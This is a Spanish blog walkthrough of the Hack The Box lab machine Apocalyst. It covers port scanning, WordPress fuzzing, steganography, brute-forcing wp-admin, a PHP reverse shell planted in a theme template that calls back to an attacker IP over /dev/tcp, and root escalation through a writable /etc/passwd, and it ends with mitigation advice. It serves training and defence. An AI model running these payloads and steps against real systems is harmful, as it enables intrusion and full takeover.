---
title: "Resolución de la máquina Apocalyst"
date: 2025-10-04 20:00:00 +0100
categories: [Ciberseguridad,Maquina]
tags: [dificultad_media, linux, wordpress, fuzzing, esteganografía]
description: "Máquina Apocalyst de Hack The Box "
image:
  path: /assets/img/posts/WriteUpApocalyst/apocalyst.png
  alt: "Información de Apocalyst"
---
## Introducción

En este post veremos la resolución de la maquina retirada apocalyst de Hack The Box , es una maquina linux de dificultad media y  en ella tocaremos los siguientes temas.

- Esteganografía
- Wordpress
- Fuzzing

---

## 1 Reconocimiento

### 1.1 Escaneo de puertos

 Primero comenzamos con un escaneo basico de puertos  con el comando

`nmap -p- -open- -sS --min-rate 5000 -vvv -Pn -n -oG allPorts 10.129.23.177`

Durante este proceso realizamos un escaneo completo de los 65.535 puertos TCP mediante el parámetro -p-, lo que nos permite obtener una visión exhaustiva de la superficie de exposición del sistema analizado. Para optimizar el análisis y centrarnos exclusivamente en información relevante, empleamos la opción -open-, filtrando únicamente los puertos que se encuentran abiertos, ya que los puertos cerrados o filtrados no aportan valor en fases iniciales de enumeración.

Para continuar utlizamos el parametro -sS para especificar que queremos hacer un SYN Scan ya que este es mas rapido que el parametro -sT ya que no completa el handshake TCP y deja menos rastro.

Con el objetivo de mejorar el rendimiento del escaneo y reducir los tiempos de ejecución, utilizamos el parámetro --min-rate 5000, garantizando un envío mínimo de 5.000 paquetes por segundo. Esta opción en este caso es eficaz ya que el "ruido" en la red no nos preocupa al ser un entorno controlado pero cabe recalcar que a cuantos mas paquetes se envien mas probabilidad hay de que salten alertas en un entorno real.

El uso del parámetro -vvv activa un modo verbose avanzado, proporcionando visibilidad detallada y en tiempo real del progreso del escaneo. Esto facilita la monitorización del proceso y permite una mejor interpretación de los resultados durante su ejecución.

Asimismo, deshabilitamos la fase de descubrimiento de hosts mediante -Pn, ya que el sistema objetivo se encuentra activo. Esta decisión estratégica evita el envío de paquetes innecesarios y contribuye a una mayor eficiencia operativa.

Para optimizar aún más el proceso, incorporamos el parámetro -n, desactivando la resolución DNS. De este modo, el análisis se centra exclusivamente en puertos y servicios, eliminando tareas accesorias que no aportan valor en esta fase del escaneo.

![1768763189775](/assets/img/posts/WriteUpApocalyst/escaneo_inicial.png)

Finalmente, exportamos los resultados utilizando -oG, generando un archivo en formato *grepeable*,este enfoque facilita la elaboración de informes técnicos y la toma de decisiones basada en datos.

Del escaneo principal  sacamos que hay dos puertos abiertos , el 22 para el ssh y el 80 para el servicio web http.

Ahora procedemos a escanear los servicios que se encuentran en esos puertos.

`nmap -sCV -p22,80 -oN targeted 10.129.23.177`

Para ello simplemente usamos el parámetro -sCV para lanzar algunos scripts que tiene nmap para identificar las versiones e información valiosa de esos servicios que están activos, también exportamos el escaneo a un archivo llamado targeted en formato nmap para analizarlo bien.

![1768763189775](/assets/img/posts/WriteUpApocalyst/escaneo_detallado.png)

Como información valiosa obtenemos la versión del servicio ssh que en este caso no podemos sacar mucho, también obtenemos que en el puerto 80 esta activo un sitio Wordpress con la versión 4.8 (que esta desactualizada) y la versión de Apache 2.4.18 que esta obsoleta también pero en este caso no tomaremos ese camino.

### 1.2 Reconociminento Web

Habiendo hecho el escaneo principal, nos vamos al sitio web para seguir extrayendo información.

![1768763189775](/assets/img/posts/WriteUpApocalyst/web_1.png)

A simple vista vemos que hay un usuario llamado Falaraki , para comprobar si este usuario existe en el sistema hay varias formas pero la mas sencilla es si tiene activado el wp-admin y accesible para todos los usuarios.

Como no se ha quitado el mensaje por defecto que tiene Wordpress de error de login, vemos que nos dice que la contraseña para el usuario falaraki es incorrecta, por lo tanto ya sabemos que ese usuario existe.

![1768763189775](/assets/img/posts/WriteUpApocalyst/user_wp.png)

### 1.3 Fuzzing

Continuamos con la enumeración y ahora haremos fuzzing, como con diccionarios de Seclists no encontramos nada vamos a crear un diccionario personalizado para esta página con la herramienta Cewl.

Crearemos el diccionario con este comando con el parametro -w para especificar el nombre que le queremos poner a nuestro diccionario.

`cewl http://10.129.45.220 -w wordlist.txt`

Procederemos con el fuzzing inicial con el comando este comando , siendo los parametros,  -c para darle colores a la salida , -w para utilizar el diccionario que hemos creado antes, -u para indicar la direccion objetivo con la palabra FUZZ al final para indicar donde se sustituiran las palabras del diccionario, --hc=404 para ocultar el codigo de estado 404 que indica que un recurso no existe y -t 50 para especificar los hilos con los que haremos el escaneo.

`wfuzz -c -w diccionario.txt -u 'http://10.129.45.220/FUZZ' --hc=404 -t 50`

![1768763189775](/assets/img/posts/WriteUpApocalyst/fuzzing_inicial.png)

En el escaneo inicial vemos que todos los codigos de respuesta son 301 esto indica redireccion global asi que probare poniendo una / al final de FUZZ

`wfuzz -c -w diccionario.txt -u 'http://10.129.45.220/FUZZ/' --hc=404 -t 50`

![1768763189775](/assets/img/posts/WriteUpApocalyst/imagen_diferente.png)

Aqui vemos que nos da todo codigos de estado 200 , es decir, hemos pasado la redireccion y llegado al destino final. A simple vista parece que todos los resultados son los mismos pero si nos fijamos hay uno que varía en palabras y caracteres lo cual es bastante raro.

Si vemos el destino final de esa ruta y las demas vemos que son imagenes iguales a simple vista pero aqui entra el juego la Esteganografía.

![1768763189775](/assets/img/posts/WriteUpApocalyst/imagen_navegador.png)

### 1.4 Esteganografía

Descargamos la imagen y la analizamos con la herramienta Steghide

![1768763189775](/assets/img/posts/WriteUpApocalyst/steghide.png)

Y vemos que hay un archivo oculto llamado list.txt en la imagen . (Cabe  destacar que el archivo no estaba protegido por contraseña ya que nos pidio contraseña pero la omitimos y nos dejo verlo)

Ahora procedemos a extraer el archivo de la imagen con la misma herramienta. Utilizaremos el comando:

`steghide extract -sf list.txt`

![1768763189775](/assets/img/posts/WriteUpApocalyst/steghide2.png)

### 1.5 Fuerza bruta al wp-admin expuesto

Habiendo obtenido una especie de lo que parece ser un diccionario , como ya contamos con un usuario y el wp-admin del sitio esta expuesto procederemos a intentar un ataque de fuerza bruta al mismo para probar si alguna contraseña es valida.

Para ello usaremos el siguiente comando siendo --url el parametro para indicar la dirección del objetivo , --passwords para indicar el diccionario que hemos obtenido antes de la imagen y --usernames el usuario o usuarios que conocemos y que es valido , en este caso , falaraki.

`wpscan --url http://10.129.37.146 --passwords list.txt --usernames falaraki`

Y como vemos hemos obtenido una contraseña valida para el usuario falaraki.

![1768763189775](/assets/img/posts/WriteUpApocalyst/bruteforce-valid.png)

Si probamos la contraseña en el /wp-admin del sitio vemos que nos da login valido por lo tanto ya tenemos acceso apartado "admin" de la web.

![1768763189775](/assets/img/posts/WriteUpApocalyst/login_valido.png)

## 2 Explotación

### 2.1 Reverse Shell

Una vez dentro como el usuario admin que puede editar plantillas lo que haré sera enviar una reverse shell a mi maquina editando el codigo de una plantilla determinada , en este caso , la que se envia al solicitar un recurso no existente en el servidor , 404.php , para ello nos iremos a appearance--> editor --> 404.php.

Usaremos este codigo php para enviar la reverse shell a nuestra maquina atacante, siendo 10.10.14.240 , la ip de la maquina atacante

`<?php`

`system("bash -c 'bash -i >& /dev/tcp/10.10.14.240/443 0>&1'")`

`?>`

Ahora nos pondremos en escucha por el puerto 443 en nuestra ip ya que hemos mandado la reverseshell a ese puerto.

Usaremos el comando siendo los parametros -n para indicarle que no queremos que resuelva direcciones DNS ya que asi sera mas rapido , -v de verbose para indicar que queremos que muestre información detallada, -l para poner a netcat en modo escucha y -p para indicar el puerto por el que queremos escuchar.

`nc -nvlp 443`

![1768763189775](/assets/img/posts/WriteUpApocalyst/comando_netcat.png)

Acto seguido solicitaremos exactamente la plantilla en la que hemos insertado el codigo malicioso en un navegador nuevo.

![1768763189775](/assets/img/posts/WriteUpApocalyst/reverseshell_navegador.png)

Ya hemos recibido la revershell en nuestra terminal donde nos pusimos por escucha por el puerto 443 anteriormente.

![1768763189775](/assets/img/posts/WriteUpApocalyst/shell_recibida.png)

Si nos vamos al directorio del usuario falaraki siendo /home/falaraki/ vemos que tenemos la flag user.txt con lo cual ya tenemos acceso al sistema , pero habría que escalar privilegios para tener acceso total.

![1768763189775](/assets/img/posts/WriteUpApocalyst/flag1.png)

## 3 Escalada de privilegios

### 3.1 Archivo /etc/passwd con permisos de escritura para todos los usuarios

Enumerando el sistema por dentro nos encontramos varias cosas interesantes:

- Kernel antiguo y con diferentes cves para escalada de privilegios

  ![1768763189775](/assets/img/posts/WriteUpApocalyst/kernelantiguo.png)
- Archivo /etc/passwd con permisos de escritura para todos los usuarios

  ![1768763189775](/assets/img/posts/WriteUpApocalyst/permisosetcpasswd.png)

Teniendo este archivo vamos a proceder a crear un hash Linux DES-crypt para poder sustuirlo en el /etc/passwd y escalar privilegios.

Vamos a usar el comando:

`openssl passwd`

Nos pedira la contraseña y generara el hash que debemos copiar y pegar en el /etc/passwd

  ![1768763189775](/assets/img/posts/WriteUpApocalyst/openssl.png)

Una vez generado el hash y copiado abrimos el archivo /etc/passwd y como podemos escribir en el puesto que otros tiene el permiso rw- procedemos a sustituir la x del segundo lugar por el hash que hemos generado

 ![1768763189775](/assets/img/posts/WriteUpApocalyst/etcpasswdmodificado.png)

Guardamos y cambiamos al usuario superusuario con el comando

`su`

 ![1768763189775](/assets/img/posts/WriteUpApocalyst/su.png)

Ya estariamos como root y solo quedaria copiar la flag de root para finalizar la maquina

 ![1768763189775](/assets/img/posts/WriteUpApocalyst/flag2.png)

## 4 Mitigación de vectores de ataque

Si esta maquina de Hack The Box hubiese sido un entorno real podriamos haber tomado las siguientes medidas para haber evitado un ataque como este:

#### Fase de reconocimiento

- Actualización versiones Wordpress y Apache: En este caso no hemos usado ninguna vulnerabilidad de esta versión de Wordpress o Apache pero lo ideal seria mantener actualizadas ambas   cosas para reducir la probabilidad de ataques mediante estas versiones desactualizadas.
- En cuanto al usuario que hemos descubierto que estaba público en la web , lo ideal hubiese sido que no hubiese apartado de Post publicado por (usuario), pero como en la mayoria de blogs esto no es posible lo mas ideal seria que este usuario no hubiese tenido todos los permisos.
- En el apartado del  fuzzing y la esteganografía , no debería haber expuestas al público imágenes con diccionarios de contraseñas, pero si esto fuese necesario lo ideal seria que la imagen tuviese una contraseña robusta y no apuntada en ningún sitio para haber evitado este vector de ataque.
- Para continuar el wp-admin nunca debería esta expuesto al publico , pero si esto fuese necesario, podriamos cambiar la ruta por defecto a una no predecible ya que hay plugins para ello y que cuando un usuario intente acceder al /wp-admin de error con codigo de estado 404 o redirija a la página principal del sitio.
- Para haber evitado la fuerza bruta que hemos usado con el diccionario encontrado , si hubiesemos ocultado el wp-admin se hubiese evitado esto , pero otra manera de mitigarlo hubiese sido emplear limites de intentos y bloqueos por ip a usuarios que hagan mas de X intentos erroneos.

#### Fase de explotación

- Para haber evitado nuestro vector de ataque de la reverse shell lo mas idoneo hubiese sido que el usuario falaraki no hubiese tenido permiso de escritura por lo tanto no nos hubiese permitido introducir el codigo malicioso

### Escalada de privilegios

- Mantener actualizado el sistema hubiese sido una gran manera de bajar probabilidades de escalada ya que hay muchas cves para poder escalar privilegios en versiones antiguas.
- Para finalizar el archivo /etc/passwd nunca deberia tener permisos de escritura por otros usuarios , solo tiene que poder modificarlo root, ya que al poder ser editado por todos hemos visto como podemos ganar acceso a root sin conocer ninguna credencial.
